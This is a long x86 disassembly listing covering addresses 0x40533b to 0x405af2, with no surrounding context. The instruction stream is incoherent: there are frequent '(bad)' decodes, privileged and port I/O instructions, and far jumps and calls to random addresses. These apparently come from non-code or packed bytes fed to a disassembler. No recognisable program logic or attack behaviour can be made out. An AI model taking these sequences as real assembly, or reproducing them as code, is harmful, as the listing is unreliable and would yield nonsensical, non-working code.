  40533b:	aaa    
  40533c:	dec    ebp
  40533d:	mov    al,ds:0xa756dcaf
  405342:	jns    0x4053a2
  405344:	xor    DWORD PTR [eax],esi
  405346:	add    DWORD PTR [eax],0x5c
  405349:	jno    0x40539f
  40534b:	mov    esi,0x152254c5
  405350:	retf   
  405351:	idiv   DWORD PTR [esi-0x4cfab2b1]
  405357:	jnp    0x405303
  405359:	loope  0x405394
  40535b:	mov    dl,0x39
  40535d:	inc    edi
  40535e:	test   DWORD PTR [esi+0xb],ebp
  405361:	outs   dx,DWORD PTR ds:[esi]
  405362:	lock int3 
  405364:	xchg   esp,eax
  405365:	(bad)  
  405366:	icebp  
  405367:	pushf  
  405368:	sub    al,0xd0
  40536a:	jno    0x4052f3
  40536c:	retf   
  40536d:	inc    ebx
  40536e:	adc    al,0x38
  405370:	push   ebp
  405371:	or     eax,0xb307440d
  405376:	cld    
  405377:	push   edi
  405378:	xchg   dh,al
  40537a:	inc    edx
  40537b:	xchg   edi,eax
  40537c:	mov    ch,0xfb
  40537e:	ficomp WORD PTR [eax+0x68]
  405381:	cli    
  405382:	ss clc 
  405384:	push   ss
  405385:	or     esi,DWORD PTR [edx]
  405387:	hlt    
  405388:	push   esp
  405389:	out    0x1f,eax
  40538b:	push   esi
  40538c:	in     eax,dx
  40538d:	call   0xdb075048
  405392:	sub    ch,BYTE PTR [ebx]
  405394:	in     eax,dx
  405395:	ss enter 0xce97,0x8e
  40539a:	mov    dh,0x85
  40539c:	sbb    ecx,DWORD PTR [edx+eiz*4-0x1e03970f]
  4053a3:	inc    esp
  4053a4:	iret   
  4053a5:	sub    bh,BYTE PTR [ecx-0x65]
  4053a8:	or     ebx,DWORD PTR [edx]
  4053aa:	add    dl,BYTE PTR [edx+0x49216f95]
  4053b0:	mov    al,0x4c
  4053b2:	dec    esp
  4053b3:	and    al,0xb5
  4053b5:	mov    ecx,0xb477715d
  4053ba:	mov    BYTE PTR [ecx],ch
  4053bc:	popf   
  4053bd:	iret   
  4053be:	sti    
  4053bf:	sbb    dh,ah
  4053c1:	ret    
  4053c2:	dec    edi
  4053c3:	gs iret 
  4053c5:	inc    ecx
  4053c6:	aaa    
  4053c7:	pop    edi
  4053c8:	iret   
  4053c9:	mov    al,0xe2
  4053cb:	mov    cl,0x31
  4053cd:	cdq    
  4053ce:	cdq    
  4053cf:	mov    ds:0x661f08c6,al
  4053d4:	mov    cs,ecx
  4053d6:	es in  al,0x2
  4053d9:	pop    edx
  4053da:	xchg   ebx,eax
  4053db:	in     al,dx
  4053dc:	sbb    DWORD PTR [eax-0x3e74682d],0x7f
  4053e3:	ret    0xcfda
  4053e6:	int    0x61
  4053e8:	pusha  
  4053e9:	test   eax,0x138947b2
  4053ee:	sbb    eax,0x950ed18
  4053f3:	ins    DWORD PTR es:[edi],dx
  4053f4:	or     bl,0x25
  4053f7:	imul   ebx,DWORD PTR [ecx],0x7c034b04
  4053fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053fe:	adc    ch,BYTE PTR [eax+0x67]
  405401:	cmp    eax,0x45d5e60b
  405406:	fs jne 0x405474
  405409:	adc    eax,0x7832c1df
  40540e:	push   edx
  40540f:	mov    ah,0xe1
  405411:	ins    BYTE PTR es:[edi],dx
  405412:	mov    cl,0x3a
  405414:	push   eax
  405415:	mov    edx,0x572623a4
  40541a:	mov    ecx,0x2ea05588
  40541f:	sbb    BYTE PTR [esi],bl
  405421:	mov    ds:0x79c4b283,al
  405426:	(bad)  
  405427:	fild   QWORD PTR [ecx-0x57]
  40542a:	call   0xfb229b2e
  40542f:	mov    dh,0xc6
  405431:	push   ecx
  405432:	aad    0xe6
  405434:	push   edx
  405435:	cmp    dh,bh
  405437:	xlat   BYTE PTR ds:[ebx]
  405438:	and    BYTE PTR [esp+ebp*4-0x70],ah
  40543c:	xor    BYTE PTR [edi-0x6bc6ecaf],cl
  405442:	jmp    0x7f651a5f
  405447:	add    DWORD PTR [ebx-0x111734a8],ebx
  40544d:	pushf  
  40544e:	add    BYTE PTR [eax],ch
  405450:	es mov ecx,esi
  405453:	jae    0x4054cb
  405455:	das    
  405456:	and    al,0x78
  405458:	jns    0x4054d6
  40545a:	bsf    ebp,DWORD PTR [ebx+0x70ef869d]
  405461:	iret   
  405462:	and    DWORD PTR [edi+0x314fa0f3],esi
  405468:	(bad)  
  405469:	xchg   esi,eax
  40546a:	dec    ebx
  40546b:	aaa    
  40546c:	dec    edx
  40546d:	cli    
  40546e:	loope  0x4054c2
  405470:	in     al,0x1d
  405472:	or     ebx,DWORD PTR [ebx+0x6e511ec9]
  405478:	out    dx,eax
  405479:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40547a:	mov    edi,0xd87cada8
  40547f:	(bad)  
  405480:	jp     0x40549c
  405482:	inc    ebp
  405483:	dec    edi
  405484:	aas    
  405485:	sub    DWORD PTR [eax+edi*4],0xffffffa0
  405489:	sbb    ecx,edi
  40548b:	add    BYTE PTR ds:0x23945576,ah
  405491:	js     0x4054cf
  405493:	call   0x50c29340
  405498:	es dec esi
  40549a:	lods   eax,DWORD PTR ds:[esi]
  40549b:	imul   edi,DWORD PTR [ecx-0x6983eaa2],0xffffffd1
  4054a2:	aas    
  4054a3:	adc    ch,BYTE PTR [edx-0x69]
  4054a6:	jae    0x405485
  4054a8:	fild   WORD PTR [ebx-0x269bb795]
  4054ae:	mov    eax,DWORD PTR [esi+0x1109a1aa]
  4054b4:	or     edx,DWORD PTR [ecx]
  4054b6:	mov    esi,0xa8207a29
  4054bb:	fst    QWORD PTR [ecx+0x2f9ac5e6]
  4054c1:	mov    BYTE PTR [edi+0x3961d276],al
  4054c7:	ds leave 
  4054c9:	retf   
  4054ca:	stos   DWORD PTR es:[edi],eax
  4054cb:	ss ret 0x1618
  4054cf:	pop    edx
  4054d0:	in     eax,0x28
  4054d2:	leave  
  4054d3:	jns    0x4054ef
  4054d5:	mov    ss,WORD PTR [edi-0x2e816795]
  4054db:	out    dx,eax
  4054dc:	pushf  
  4054dd:	sub    eax,0xd1aa08f4
  4054e2:	fs and al,0x56
  4054e5:	jbe    0x4054e6
  4054e7:	push   edi
  4054e8:	cmp    DWORD PTR [edx+0x7e],0x50
  4054ec:	push   ebx
  4054ed:	(bad)  
  4054ee:	out    dx,al
  4054ef:	xchg   edx,eax
  4054f0:	xchg   ebx,eax
  4054f1:	stc    
  4054f2:	loope  0x40554b
  4054f4:	mov    dh,BYTE PTR [edx]
  4054f6:	adc    edx,DWORD PTR [ebx-0x11995f15]
  4054fc:	push   ebp
  4054fd:	sub    ebp,DWORD PTR [esi]
  4054ff:	bound  ebx,QWORD PTR [ebp-0x14]
  405502:	adc    ch,ch
  405504:	call   0x84fe6d64
  405509:	xchg   edi,eax
  40550a:	jae    0x4054f2
  40550c:	push   edx
  40550d:	imul   ebx,DWORD PTR [esi],0xc9adeddb
  405513:	and    al,0x51
  405515:	fimul  DWORD PTR [esi-0xcb7bb20]
  40551b:	test   DWORD PTR [eax],ebx
  40551d:	(bad)  
  40551e:	cld    
  40551f:	out    0x18,eax
  405521:	push   es
  405522:	push   edx
  405523:	and    BYTE PTR [edx+ebx*1-0x22],0xd4
  405528:	outs   dx,BYTE PTR ds:[esi]
  405529:	pop    ebp
  40552a:	and    BYTE PTR [eax-0x4fa0e21b],bh
  405530:	cmp    eax,0x82d67656
  405535:	das    
  405536:	and    esp,DWORD PTR [ecx-0x384476bf]
  40553c:	add    al,0x7d
  40553e:	out    dx,al
  40553f:	outs   dx,BYTE PTR ss:[esi]
  405541:	test   edx,0x3f58563a
  405547:	inc    eax
  405548:	or     al,BYTE PTR [ebx+ecx*8-0x12e490c2]
  40554f:	call   0x7abed98f
  405554:	dec    esi
  405555:	test   BYTE PTR [ecx],ch
  405557:	xchg   bh,bl
  405559:	arpl   WORD PTR [esi+0x3d55aa0],ax
  40555f:	jmp    0xd19e:0xcdf5a239
  405566:	mov    ch,0x87
  405568:	sub    al,0x98
  40556a:	cwde   
  40556b:	loope  0x40552d
  40556d:	int    0x8b
  40556f:	cmp    eax,0x89cf3c33
  405574:	push   edx
  405575:	das    
  405576:	add    BYTE PTR [ecx],ch
  405578:	repnz ins DWORD PTR es:[edi],dx
  40557a:	into   
  40557b:	retf   0x4540
  40557e:	call   0xebaf:0xf4878de5
  405585:	out    dx,al
  405586:	xchg   ecx,eax
  405587:	mov    bl,0x19
  405589:	cmc    
  40558a:	lahf   
  40558b:	push   ebx
  40558c:	push   esi
  40558d:	inc    eax
  40558e:	sbb    BYTE PTR [edi],bl
  405590:	inc    esi
  405591:	adc    DWORD PTR [ebp-0x5901e155],esi
  405597:	loopne 0x40556e
  405599:	rcl    DWORD PTR [edi],1
  40559b:	clc    
  40559c:	jmp    0x43ceea89
  4055a1:	push   edx
  4055a2:	(bad)  
  4055a4:	xlat   BYTE PTR ds:[ebx]
  4055a5:	inc    ecx
  4055a6:	out    dx,al
  4055a7:	jb     0x405531
  4055a9:	imul   esi,DWORD PTR [eax+0x66],0xffffffa2
  4055ad:	adc    al,BYTE PTR [ecx+ecx*8-0x5c3e2e84]
  4055b4:	jnp    0x405567
  4055b6:	test   eax,0xf71f6de2
  4055bb:	cld    
  4055bc:	jmp    0x40562a
  4055be:	add    esp,DWORD PTR [ebx-0x4f]
  4055c1:	jmp    0x6eb6b0a8
  4055c6:	sbb    BYTE PTR [ecx-0x23],al
  4055c9:	pop    esi
  4055ca:	jl     0x405608
  4055cc:	push   eax
  4055cd:	gs je  0x4055f8
  4055d0:	aam    0x70
  4055d2:	imul   ebx,DWORD PTR [eax-0xe],0x4a88fd73
  4055d9:	fwait
  4055da:	lods   al,BYTE PTR ds:[esi]
  4055db:	mov    ds,edx
  4055dd:	ss icebp 
  4055df:	test   al,0x8f
  4055e1:	ror    DWORD PTR [esi+0x6d],0xc0
  4055e5:	jle    0x405652
  4055e7:	in     al,0x2e
  4055e9:	cwde   
  4055ea:	loopne 0x405615
  4055ec:	icebp  
  4055ed:	push   esi
  4055ee:	outs   dx,BYTE PTR ds:[esi]
  4055ef:	mov    dl,0x22
  4055f1:	sub    BYTE PTR [edi],0xa8
  4055f4:	int3   
  4055f5:	sti    
  4055f6:	js     0x405643
  4055f8:	mov    bl,0x78
  4055fa:	and    edx,ecx
  4055fc:	or     cl,BYTE PTR [ebx+0x33]
  4055ff:	clc    
  405600:	fcmovnu st,st(0)
  405602:	sub    cl,BYTE PTR [eax+eiz*2-0x39]
  405606:	in     eax,0xf0
  405608:	fild   QWORD PTR [ecx]
  40560a:	or     cl,BYTE PTR [esp+edi*8]
  40560d:	mov    WORD PTR fs:[edx-0x68],fs
  405611:	sbb    ah,al
  405613:	or     al,0x37
  405615:	xor    edx,DWORD PTR [esi-0x64]
  405618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405619:	inc    edx
  40561a:	xor    DWORD PTR ds:0x1b39d2d3,ecx
  405620:	mov    ebp,0x7078cc23
  405625:	mov    eax,0x25d83a1f
  40562a:	dec    edi
  40562b:	pusha  
  40562c:	pop    ds
  40562d:	dec    edx
  40562e:	inc    edi
  40562f:	cli    
  405630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405631:	outs   dx,BYTE PTR ds:[esi]
  405632:	gs cmc 
  405634:	int    0xdd
  405636:	mov    al,ds:0x3301e438
  40563b:	mov    esp,0xd7194446
  405640:	outs   dx,DWORD PTR ds:[esi]
  405641:	cmp    esi,DWORD PTR ds:0x225dffe2
  405647:	mov    eax,0x27b41cfc
  40564c:	neg    BYTE PTR [ecx-0x47]
  40564f:	jp     0x405674
  405651:	pop    ebx
  405652:	jae    0x40569f
  405654:	js     0x4055d7
  405656:	ficom  DWORD PTR [edx+0xe963cf7]
  40565c:	ss xchg esi,eax
  40565e:	ror    BYTE PTR [ecx-0x4592cc78],1
  405664:	pop    ebp
  405665:	js     0x405623
  405667:	stos   BYTE PTR es:[edi],al
  405668:	jno    0x405645
  40566a:	outs   dx,BYTE PTR ds:[esi]
  40566b:	push   esi
  40566c:	frstor [edx-0x72c1eea4]
  405672:	rcl    BYTE PTR [ecx-0x50],1
  405675:	xchg   DWORD PTR [eax-0x73f0c405],edx
  40567b:	mov    ch,0x89
  40567d:	mov    dl,0x97
  40567f:	dec    esp
  405680:	les    edx,FWORD PTR [edx]
  405682:	cmp    esp,eax
  405684:	jmp    0x5d6b2d5f
  405689:	jo     0x405686
  40568b:	or     al,0x77
  40568d:	inc    edi
  40568e:	xchg   edi,eax
  40568f:	jmp    0x2ef5:0xa42ba266
  405696:	(bad)  
  405697:	dec    ebx
  405698:	test   BYTE PTR [ecx],ah
  40569a:	int    0xf9
  40569c:	addr16 dec eax
  40569e:	jecxz  0x405659
  4056a0:	in     al,0x2d
  4056a2:	fisub  DWORD PTR [ecx+eax*1]
  4056a5:	dec    esi
  4056a6:	retf   
  4056a7:	call   0xccf7498d
  4056ac:	call   0x7ba96196
  4056b1:	add    DWORD PTR [ebx],edx
  4056b3:	dec    ecx
  4056b4:	(bad)  
  4056b5:	div    BYTE PTR [eax]
  4056b7:	inc    ebx
  4056b8:	mov    dl,0xb1
  4056ba:	call   0x42d7:0xa14d446b
  4056c1:	add    eax,0x1fddb282
  4056c6:	shl    esi,0xda
  4056c9:	lock and DWORD PTR [eax-0x292a8692],ecx
  4056d0:	mov    bl,0x54
  4056d2:	int3   
  4056d3:	mov    ah,0xce
  4056d5:	xchg   DWORD PTR [ebx+ebp*1],edi
  4056d8:	scas   eax,DWORD PTR es:[edi]
  4056d9:	fisttp QWORD PTR [eax-0xe]
  4056dc:	sub    eax,ebx
  4056de:	add    ebx,DWORD PTR [eax+0x28]
  4056e1:	aam    0x79
  4056e3:	xchg   esp,eax
  4056e4:	int    0x6e
  4056e6:	inc    eax
  4056e7:	push   esi
  4056e8:	adc    eax,esp
  4056ea:	pop    ss
  4056eb:	push   edx
  4056ec:	cld    
  4056ed:	xchg   ebp,eax
  4056ee:	in     al,dx
  4056ef:	sub    DWORD PTR [edi+0x19],0x47
  4056f3:	cwde   
  4056f4:	scas   al,BYTE PTR es:[edi]
  4056f5:	addr16 and al,0x30
  4056f8:	xlat   BYTE PTR ds:[ebx]
  4056f9:	xchg   ebp,eax
  4056fa:	imul   esi,DWORD PTR [ebp+0x2646f0ed],0x55
  405701:	dec    edi
  405702:	xor    al,0x81
  405704:	dec    esp
  405705:	pop    ecx
  405706:	add    cl,0xd0
  405709:	hlt    
  40570a:	cmp    ch,BYTE PTR ds:0x6fb7d7e2
  405710:	pop    ebp
  405711:	out    0xa8,eax
  405713:	fnsave [eax]
  405715:	fmul   DWORD PTR [ebx+eiz*2]
  405718:	xchg   ebp,eax
  405719:	cmp    eax,edx
  40571b:	call   0x6eca:0x81cf2071
  405722:	fstp   TBYTE PTR [ebx]
  405724:	sbb    BYTE PTR [esi+0x5a61eba6],0xb0
  40572b:	mov    esi,0xce058cca
  405730:	jbe    0x4056bc
  405732:	push   es
  405733:	ret    0x4eac
  405736:	cmp    esp,DWORD PTR [ebp+edx*8-0x73cd0a96]
  40573d:	pop    edi
  40573e:	mov    ebp,ecx
  405740:	in     al,dx
  405741:	test   al,0x3
  405743:	xchg   ecx,eax
  405744:	test   BYTE PTR [edi],bh
  405746:	inc    ebp
  405747:	push   eax
  405748:	cs into 
  40574a:	xchg   bh,bl
  40574c:	and    DWORD PTR [esp+ecx*4],edx
  40574f:	cs sbb al,0x4f
  405752:	outs   dx,BYTE PTR ds:[esi]
  405753:	pop    ecx
  405754:	test   al,0x10
  405756:	jge    0x405725
  405758:	cmp    esi,DWORD PTR [ebp+0x3c]
  40575b:	mov    cl,cl
  40575d:	cmp    DWORD PTR [edi+eiz*2],0xffffffd2
  405761:	push   ss
  405762:	sahf   
  405763:	xchg   edi,eax
  405764:	mov    dh,ch
  405766:	test   DWORD PTR [ecx],0xda09532c
  40576c:	and    DWORD PTR [edx],edi
  40576e:	outs   dx,BYTE PTR ds:[esi]
  40576f:	push   ecx
  405770:	sbb    DWORD PTR [ecx+0x4d],edx
  405773:	mov    al,0xc5
  405775:	jmp    0x706b:0x2aa53062
  40577c:	ror    eax,cl
  40577e:	add    al,0x7f
  405780:	pushf  
  405781:	cs aaa 
  405783:	push   0x5caf0ff5
  405788:	mov    cl,0x87
  40578a:	jne    0x4057b1
  40578c:	fucom  st(1)
  40578e:	or     BYTE PTR [edx-0x35],bl
  405791:	or     bl,bh
  405793:	push   ecx
  405794:	test   eax,0xc2efc769
  405799:	jp     0x40578f
  40579b:	sub    eax,0xc8a39b59
  4057a0:	pop    eax
  4057a1:	jb     0x405760
  4057a3:	or     esi,DWORD PTR [ebx+eiz*8-0x14]
  4057a7:	rcl    bl,cl
  4057a9:	scas   al,BYTE PTR es:[edi]
  4057aa:	or     al,0xad
  4057ac:	push   esp
  4057ad:	push   es
  4057ae:	test   DWORD PTR [ecx],edi
  4057b0:	push   cs
  4057b1:	popf   
  4057b2:	dec    eax
  4057b3:	gs xor al,0xbb
  4057b6:	ins    DWORD PTR es:[edi],dx
  4057b7:	sub    eax,0xe7d12f3f
  4057bc:	hlt    
  4057bd:	(bad)  
  4057bf:	sbb    eax,0x74ccf950
  4057c4:	cmp    ebx,DWORD PTR [ebp+0x41e88776]
  4057ca:	gs in  al,0xbd
  4057cd:	xchg   esi,eax
  4057ce:	sbb    edi,DWORD PTR [ebx-0x16]
  4057d1:	mov    esi,DWORD PTR [ecx-0x5ee3f94d]
  4057d7:	js     0x405805
  4057d9:	cmp    eax,0xd1afc9c4
  4057de:	dec    ebx
  4057df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057e1:	jl     0x405816
  4057e3:	jno    0x405769
  4057e5:	cmc    
  4057e6:	and    al,0xc3
  4057e8:	jmp    DWORD PTR [ecx-0x32e4e54e]
  4057ee:	fs retf 
  4057f0:	test   al,0xe9
  4057f2:	outs   dx,BYTE PTR ds:[esi]
  4057f3:	xchg   ebx,eax
  4057f4:	fistp  WORD PTR [esi+edi*2]
  4057f7:	xchg   bh,ch
  4057f9:	xchg   ecx,eax
  4057fa:	arpl   WORD PTR ss:[esi+0x9],sp
  4057fe:	xchg   ebx,eax
  4057ff:	push   ebx
  405800:	mov    ebx,0x1646f94d
  405805:	iret   
  405806:	popf   
  405807:	inc    ebp
  405808:	pop    esp
  405809:	stos   DWORD PTR es:[edi],eax
  40580a:	loopne 0x40581e
  40580c:	sbb    bh,bl
  40580e:	jmp    0x465f:0x8c999135
  405815:	shrd   DWORD PTR [eax+0x18655618],edi,0xb3
  40581d:	xor    DWORD PTR [edi-0x21],esp
  405820:	mov    gs,edx
  405822:	pop    esp
  405823:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405824:	in     al,0x5b
  405826:	and    al,0xc
  405828:	xchg   esi,eax
  405829:	ss mov al,0xfd
  40582c:	popf   
  40582d:	jmp    0x3a82d34a
  405832:	mov    dl,0xab
  405834:	dec    edi
  405835:	mov    ebx,0x9343d31f
  40583a:	test   BYTE PTR [edx],0x97
  40583d:	sub    al,0xc5
  40583f:	in     al,dx
  405840:	dec    ecx
  405841:	aam    0x1
  405843:	not    ah
  405845:	aaa    
  405846:	outs   dx,DWORD PTR ds:[esi]
  405847:	push   edx
  405848:	adc    DWORD PTR [ebx-0x608ce443],eax
  40584e:	out    0x98,al
  405850:	xlat   BYTE PTR ds:[ebx]
  405851:	xchg   ebx,eax
  405852:	cdq    
  405853:	jae    0x4058ab
  405855:	and    al,0xa
  405857:	dec    BYTE PTR [edx+0x55]
  40585a:	pop    ebp
  40585b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40585c:	call   FWORD PTR [eax+0x6b]
  40585f:	mov    eax,0xb584a550
  405864:	pop    esi
  405865:	(bad)  [esi+0x19]
  405869:	fidivr DWORD PTR [eax]
  40586b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40586c:	xlat   BYTE PTR ds:[ebx]
  40586d:	dec    eax
  40586e:	pop    esi
  40586f:	outs   dx,BYTE PTR ds:[esi]
  405870:	fwait
  405871:	out    dx,al
  405872:	leave  
  405873:	cmp    DWORD PTR ds:[edx],ebp
  405876:	lds    edx,FWORD PTR [ecx]
  405878:	jbe    0x4058b1
  40587a:	inc    edx
  40587b:	xlat   BYTE PTR ds:[ebx]
  40587c:	add    esi,DWORD PTR [esi+0x52c115f6]
  405882:	bound  esp,QWORD PTR [eax-0x6a]
  405885:	loope  0x405901
  405887:	push   eax
  405888:	js     0x4058d4
  40588a:	fs retf 0xe9c3
  40588e:	mov    cl,0x25
  405890:	xchg   esp,eax
  405891:	add    DWORD PTR [eax+0x7ceb8f98],eax
  405897:	ja     0x405895
  405899:	jns    0x405878
  40589b:	fidiv  DWORD PTR [esp+edi*1]
  40589e:	lock in al,0xfc
  4058a1:	sbb    ebx,DWORD PTR [ebx-0x7bcedd6f]
  4058a7:	call   0x189e:0x21ee128f
  4058ae:	inc    edi
  4058af:	xor    dl,BYTE PTR [edi]
  4058b1:	lods   eax,DWORD PTR ds:[esi]
  4058b2:	xor    al,BYTE PTR [esi-0x3b]
  4058b5:	xchg   ecx,eax
  4058b6:	pop    ecx
  4058b7:	in     eax,dx
  4058b8:	cmc    
  4058b9:	enter  0x4e8f,0x1b
  4058bd:	xor    ch,BYTE PTR [eax+0x6]
  4058c0:	sub    al,0x2d
  4058c2:	call   0xdb1dde7d
  4058c7:	rcr    BYTE PTR [eax],1
  4058c9:	stos   DWORD PTR es:[edi],eax
  4058ca:	test   esp,ebx
  4058cc:	in     eax,0x26
  4058ce:	jmp    edx
  4058d0:	test   ebp,0xaee96667
  4058d6:	dec    ecx
  4058d7:	test   eax,0x5bfede9c
  4058dc:	test   DWORD PTR [esi],esi
  4058de:	jle    0x405901
  4058e0:	pop    ebx
  4058e1:	mov    ebx,0xb778315b
  4058e6:	enter  0xd0ae,0x59
  4058ea:	in     ax,0x51
  4058ed:	fsub   QWORD PTR [eax-0x40]
  4058f0:	pop    es
  4058f1:	js     0x4058b2
  4058f3:	(bad)  
  4058f4:	in     al,dx
  4058f5:	shl    DWORD PTR [edx-0x30],1
  4058f8:	mov    ebp,0xf5b89ab2
  4058fd:	push   edx
  4058fe:	lods   eax,DWORD PTR ds:[esi]
  4058ff:	idiv   DWORD PTR [edx+0x1d8c4a27]
  405905:	pop    esi
  405906:	pop    ebp
  405907:	xchg   edi,eax
  405908:	ret    0xd137
  40590b:	pop    edx
  40590c:	call   0xc270ec03
  405911:	push   ecx
  405912:	dec    esi
  405913:	push   esp
  405914:	mov    esi,0x49972b1a
  405919:	or     BYTE PTR [esi-0x1593b54],0x58
  405920:	and    esp,DWORD PTR [eax+0x5fe0e4df]
  405926:	cmc    
  405927:	adc    DWORD PTR [ecx-0x7c32578c],edi
  40592d:	mov    gs,WORD PTR [esp+ebx*2]
  405930:	pushf  
  405931:	push   eax
  405932:	outs   dx,BYTE PTR ds:[esi]
  405933:	push   edx
  405934:	add    ebp,DWORD PTR [eax]
  405936:	mov    dl,BYTE PTR [eax]
  405938:	cs icebp 
  40593a:	push   ebx
  40593b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40593c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40593d:	sbb    dl,BYTE PTR [ebp-0x2b7c057d]
  405943:	div    DWORD PTR [ecx]
  405945:	xor    dl,BYTE PTR [esi+eiz*8+0x5a39fe1d]
  40594c:	mov    ch,0x0
  40594e:	in     al,dx
  40594f:	mov    WORD PTR [edx],cs
  405951:	fcmovbe st,st(1)
  405953:	mov    ebp,0x94416ae4
  405958:	jmp    0x40595f
  40595a:	adc    ebp,esi
  40595c:	mov    ds:0x80a2eb89,al
  405961:	scas   al,BYTE PTR es:[edi]
  405962:	jns    0x405999
  405964:	add    ebx,DWORD PTR [edi]
  405966:	mov    dh,0x38
  405968:	dec    ecx
  405969:	jl     0x405965
  40596b:	cli    
  40596c:	xchg   DWORD PTR [edx],ebx
  40596e:	in     al,dx
  40596f:	loope  0x405981
  405971:	sub    edx,0x390642db
  405977:	cwde   
  405978:	push   cs
  405979:	daa    
  40597a:	imul   ecx,DWORD PTR [ebx+0x63],0xffffffd0
  40597e:	ds popf 
  405980:	inc    ecx
  405981:	das    
  405982:	cld    
  405983:	mov    ds:0x6185dc4c,eax
  405988:	(bad)  
  405989:	rcr    BYTE PTR [ebx-0x5c],cl
  40598c:	loop   0x4059b4
  40598e:	imul   ebx,DWORD PTR [ecx-0x5a446652],0xffffff9d
  405995:	mov    ?,WORD PTR [edi+0x14]
  405998:	mov    esp,0x9aaf2f77
  40599d:	test   al,0x62
  40599f:	aaa    
  4059a0:	mov    WORD PTR [eax+0x6a42c2a3],ss
  4059a6:	sub    eax,eax
  4059a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059a9:	int3   
  4059aa:	retf   0x285f
  4059ad:	call   0x671c:0x3904357d
  4059b4:	adc    DWORD PTR [ebp+ebp*4+0x2b],esi
  4059b8:	aad    0xaf
  4059ba:	aam    0xe3
  4059bc:	jmp    0x8b47364
  4059c1:	push   ebp
  4059c2:	xrelease mov BYTE PTR [ecx-0x77],ch
  4059c6:	inc    ebx
  4059c7:	mov    ebx,0xb54a736
  4059cc:	adc    edx,DWORD PTR [edx-0xe]
  4059cf:	ja     0x405a4f
  4059d1:	sub    eax,0xa76cd739
  4059d6:	push   esp
  4059d7:	pop    ds
  4059d8:	cs push eax
  4059da:	pop    es
  4059db:	sbb    ebx,DWORD PTR [ebp-0x5b4122da]
  4059e1:	xchg   ebx,eax
  4059e2:	hlt    
  4059e3:	push   ds
  4059e4:	add    al,0xf9
  4059e6:	pop    edi
  4059e7:	cli    
  4059e8:	adc    DWORD PTR [edi+0x24b0658a],esi
  4059ee:	push   0xffffffdd
  4059f0:	imul   esp,DWORD PTR [eax+0x71],0x72
  4059f4:	sub    DWORD PTR [ecx-0x1f0f1060],esp
  4059fa:	pop    es
  4059fb:	pushf  
  4059fc:	mov    ch,0xd3
  4059fe:	xchg   esi,eax
  4059ff:	pcmpgtb mm7,mm2
  405a02:	bound  edx,QWORD PTR [ebp-0x3b]
  405a05:	dec    ecx
  405a06:	xchg   edi,eax
  405a07:	push   ss
  405a08:	js     0x4059d3
  405a0a:	ss pop edi
  405a0c:	mov    esp,0x994f7d0f
  405a11:	dec    ecx
  405a12:	aad    0x89
  405a14:	jo     0x405a8e
  405a16:	mov    bl,0x3c
  405a18:	mov    es,WORD PTR [edx+0x2ae9e62a]
  405a1e:	mov    ch,0x2
  405a20:	sbb    eax,0xc1a300ac
  405a25:	xor    eax,0x55cd4af2
  405a2a:	call   DWORD PTR [ebp+ecx*8+0x6b]
  405a2e:	sub    esi,esp
  405a30:	and    al,0x65
  405a32:	in     al,0x4f
  405a34:	lods   al,BYTE PTR ds:[esi]
  405a35:	imul   edi,DWORD PTR [ecx-0x4b5b68a6],0x4a
  405a3c:	ja     0x4059d0
  405a3e:	out    dx,al
  405a3f:	jb     0x405a44
  405a41:	and    BYTE PTR [esi-0x66cf4a7e],0x29
  405a48:	in     eax,dx
  405a49:	in     eax,dx
  405a4a:	sub    BYTE PTR [edi-0x3262320f],0xb8
  405a51:	cdq    
  405a52:	outs   dx,DWORD PTR ds:[esi]
  405a53:	sbb    al,0xf6
  405a55:	not    DWORD PTR [edi+0x3a1f3ca1]
  405a5b:	pop    ebx
  405a5c:	or     eax,0x16eeac03
  405a61:	ins    DWORD PTR es:[edi],dx
  405a62:	dec    edx
  405a63:	adc    DWORD PTR [edi-0x6d849e83],0x39981394
  405a6d:	xchg   BYTE PTR [edx+0x7e878832],bl
  405a73:	out    0x79,al
  405a75:	les    esi,FWORD PTR [ebx+0x7d7e6661]
  405a7b:	rcr    BYTE PTR [edx+eiz*4+0x11],1
  405a7f:	enter  0xede,0x41
  405a83:	xor    ecx,DWORD PTR [ebx-0x2c]
  405a86:	jge    0x405aeb
  405a88:	fnsave [edi]
  405a8a:	dec    esi
  405a8b:	dec    edx
  405a8c:	push   0x4
  405a8e:	stos   DWORD PTR es:[edi],eax
  405a8f:	retf   
  405a90:	lds    ebx,FWORD PTR [ebp-0x147bfe9b]
  405a96:	es (bad) 
  405a99:	sbb    ah,dl
  405a9b:	pushf  
  405a9c:	dec    BYTE PTR [edi+0xcc58235]
  405aa2:	(bad)  
  405aa3:	push   esp
  405aa4:	jcxz   0x405abe
  405aa7:	adc    ah,bl
  405aa9:	inc    ebp
  405aaa:	sti    
  405aab:	push   esp
  405aac:	mov    esi,0xef2f54a6
  405ab1:	mov    bh,0xe9
  405ab3:	imul   ebp,DWORD PTR [edx+0x37],0xffffffd4
  405ab7:	mov    esi,0x60bf5cf6
  405abc:	test   al,0xa3
  405abe:	xchg   ecx,eax
  405abf:	call   0x4675:0xeee66355
  405ac6:	adc    edx,DWORD PTR [ecx]
  405ac8:	pop    es
  405ac9:	lock lahf 
  405acb:	push   ebx
  405acc:	std    
  405acd:	repnz and BYTE PTR [edi-0x46bbfece],bh
  405ad4:	loopne 0x405b3c
  405ad6:	(bad)  
  405ad7:	cdq    
  405ad8:	in     eax,0x63
  405ada:	(bad)  
  405adb:	adc    BYTE PTR [edi],cl
  405add:	sbb    ch,al
  405adf:	popf   
  405ae0:	dec    esi
  405ae1:	push   esp
  405ae2:	push   0x5d
  405ae4:	cs push ebx
  405ae6:	push   edx
  405ae7:	xlat   BYTE PTR ds:[ebx]
  405ae8:	dec    ecx
  405ae9:	mov    WORD PTR [edi+edx*8-0x6f],es
  405aed:	xlat   BYTE PTR ds:[ebx]
  405aee:	lods   eax,DWORD PTR ds:[esi]
  405aef:	adc    al,al
  405af1:	hlt    
  405af2:	mov    ch,0x2
